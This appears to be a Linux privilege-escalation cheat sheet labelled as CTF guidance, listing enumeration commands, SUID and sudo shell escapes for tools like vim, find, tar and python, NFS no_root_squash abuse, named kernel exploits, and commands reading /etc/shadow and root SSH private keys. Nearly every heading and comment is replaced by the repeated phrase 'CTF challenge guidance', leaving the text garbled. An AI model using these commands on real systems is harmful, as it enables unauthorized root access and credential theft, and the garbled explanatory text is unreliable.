# Linux CTF challenge guidance

## CTF challenge guidance

```bash
# LinPEAS CTF challenge guidance
# 1. CTF challenge guidance
id; whoami; sudo -l

# 2. CTF challenge guidance SUID CTF challenge guidance
find / -perm -4000 2>/dev/null

# 3. CTF challenge guidance sudo CTF challenge guidance
sudo -l

# 4. CTF challenge guidance crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. CTF challenge guidance
netstat -tulpn
ss -tulpn

# 6. CTF challenge guidance
ps aux | grep root
systemctl list-units --type=service

# 7. CTF challenge guidance
find / -writable -type d 2>/dev/null | grep -v proc

# 8. CTF challenge guidance
uname -a
cat /etc/issue

# 9. CTF challenge guidance sudo CTF challenge guidance (CVE)
sudo --version

# 10. CTF challenge guidance polkit CTF challenge guidance
pkexec --version
```

## CTF challenge guidance

### 1. SUID CTF challenge guidance

```bash
# CTF challenge guidance SUID
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Sudo CTF challenge guidance

```bash
# sudo -l CTF challenge guidance
# CTF challenge guidance
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Cron CTF challenge guidance

```bash
# CTF challenge guidance cron CTF challenge guidance
cat /etc/crontab
ls -la /etc/cron.d/
# CTF challenge guidance cron CTF challenge guidance root CTF challenge guidance
# CTF challenge guidance
```

### 4. NFS CTF challenge guidance

```bash
# CTF challenge guidance /home CTF challenge guidance no_root_squash
# CTF challenge guidance
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# CTF challenge guidance /tmp/nfs/bash_suid -p
```

### 5. CTF challenge guidance

```python
# CTF challenge guidance exploit
# CTF challenge guidance：
# - dirtycow (CVE-2016-5195)
# - docker breakout
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. CTF challenge guidance

```bash
# CTF challenge guidance
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# CTF challenge guidance，CTF challenge guidance su root CTF challenge guidance ssh root@localhost
```

## CTF challenge guidance

```
/etc/passwd          # CTF challenge guidance
/etc/shadow          # CTF challenge guidance
/root/.ssh/          # root SSH CTF challenge guidance
/home/*/.ssh/       # CTF challenge guidance SSH CTF challenge guidance
/var/www/html/       # Web CTF challenge guidance（CTF challenge guidance）
/tmp/                # CTF challenge guidance（CTF challenge guidance payload）
/etc/cron.d/         # Cron CTF challenge guidance
/proc/self/environ   # CTF challenge guidance（CTF challenge guidance）
/proc/self/fd/       # CTF challenge guidance（CTF challenge guidance）
```

## GTFOBins (sudo suid CTF challenge guidance)

| CTF challenge guidance | CTF challenge guidance |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
